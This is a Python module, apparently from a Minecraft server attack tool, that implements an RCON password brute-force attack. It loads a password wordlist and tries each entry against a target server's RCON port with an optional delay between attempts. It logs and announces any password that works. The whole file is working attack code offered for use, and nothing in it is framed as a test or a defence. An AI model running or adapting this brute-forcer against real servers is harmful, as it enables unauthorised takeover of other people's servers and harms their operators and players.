import time

from mcrcon import MCRcon, MCRconException
from utils.alerts.Alerts import alert
from utils.banners.BannerMessages import *
from utils.checks.Encoding import check_encoding
from utils.color.TextColor import paint
from utils.gets.Language import language
from utils.gets.LogFile import create_file
from utils.managers.Logs import LogsManager
from utils.managers.Settings import SettingsManager


def rcon_command(server, password_file, delay=None):
    """ 
    Performs a brute force attack against the 
    RCON of the specified server.
    
    Parameters:
    server (str): IP Address and RCON Port.
    password_file (str): Password file.
    delay (str): Optional delay for password entry.
    """

    sm = SettingsManager()
    settings = sm.read('settings')
    mcptool_version = settings['CURRENT_VERSION'].split('///')[1]
    attack_finished = False
    password_found = False

    # Create a file to save the logs.
    file = create_file('rcon')

    # Create a LogsManager object to write the logs to the file.
    logs = LogsManager('rcon', file)

    if delay is not None:
        if not delay.replace('.', '').isdigit():
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["INVALID_ARGUMENTS"]["INVALID_DELAY"]}')
            return
        
    try:
        paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["PREPARING_THE_ATTACK"]}')
        time.sleep(1)

        with open(password_file, 'r', encoding=check_encoding(password_file)) as f:
            passwords = f.readlines()

        if len(passwords) == 0:
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["EMPTY_FILE"]}')
            return

        paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["NUMBER_OF_PASSWORDS"].replace("[0]", password_file).replace("[1]", str(len(passwords)))}')
        time.sleep(1)

        paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["STARTING_THE_ATTACK"]}')
        time.sleep(1.5)

        logs.create(server, password_file)
        server = server.split(':')
        print('')

    except KeyboardInterrupt:
        paint(f'\n    {language["script"]["PREFIX"]}{rcon_stopping}')
        return

    while True:
        try:
            if attack_finished:
                if password_found:
                    if settings['SOUNDS']:
                        alert('Alert-0')

                    paint(f'\n    {language["script"]["PREFIX"]}{rcon_pwd_found.replace("[0]", password)}')
                    logs.write('save_rcon_password', password)

                else:
                    if settings['SOUNDS']:
                        alert('Alert-0')

                    paint(f'\n    {language["script"]["PREFIX"]}{rcon_pwd_not_found}')
                    logs.write('save_rcon_password', 'Not found!')
                
                break

            for password in passwords:
                password = password.replace('\n', '')
                paint(f'    {language["script"]["PREFIX"]}{rcon_trying_password.replace("[0]", password)}')
                
                if delay is not None:
                    try:
                        time.sleep(int(delay))

                    except ValueError:
                        time.sleep(float(delay))

                try:
                    with MCRcon(server[0], password, int(server[1]), timeout=35) as mcr:
                        mcr.disconnect()

                    password_found = True
                    break
                
                except MCRconException:
                    continue

                except TimeoutError:
                    paint(f'\n    {language["script"]["PREFIX"]}{rcon_timeout}')

                except ConnectionRefusedError:
                    paint(f'\n    {language["script"]["PREFIX"]}{rcon_connection_refused}')

                except Exception as e:
                    paint(f'\n    {language["script"]["PREFIX"]}{language["banners"]["rcon"]["ERROR"].replace("[0]", str(e))}')
                
                return

            attack_finished = True

        except KeyboardInterrupt:
            paint(f'\n    {language["script"]["PREFIX"]}{rcon_stopping}')
            return
